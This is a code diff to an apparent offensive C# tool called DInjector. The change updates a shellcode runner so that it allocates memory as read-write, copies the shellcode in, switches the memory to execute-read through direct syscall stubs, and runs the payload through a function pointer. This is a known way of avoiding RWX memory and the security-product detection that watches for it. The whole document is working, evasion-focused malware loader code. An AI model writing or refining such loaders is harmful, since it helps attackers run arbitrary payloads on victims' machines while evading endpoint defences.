@@ -18,13 +18,21 @@ namespace DInjector
             uint Protect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
+            IntPtr ProcessHandle,
+            ref IntPtr BaseAddress,
+            ref IntPtr RegionSize,
+            uint NewProtect,
+            out uint OldProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate void pFunction();
 
         public static void Execute(byte[] shellcodeBytes)
         {
             var shellcode = shellcodeBytes;
 
-            #region NtAllocateVirtualMemory
+            #region NtAllocateVirtualMemory (PAGE_READWRITE)
 
             IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
             NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
@@ -39,18 +47,42 @@ namespace DInjector
                 IntPtr.Zero,
                 ref regionSize,
                 DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
-                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE);
+                DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtAllocateVirtualMemory");
+                Console.WriteLine("(FunctionPointer) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(FunctionPointer) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
             }
 
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
+
+            #endregion
+
+            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
+
+            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
+            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
+
+            ntstatus = sysNtProtectVirtualMemory(
+                Process.GetCurrentProcess().Handle,
+                ref baseAddress,
+                ref regionSize,
+                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
+                out uint _);
+
+            if (ntstatus == 0)
+            {
+                Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
+            }
+            else
+            {
+                Console.WriteLine($"(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
+            }
+
             pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
             f();
 
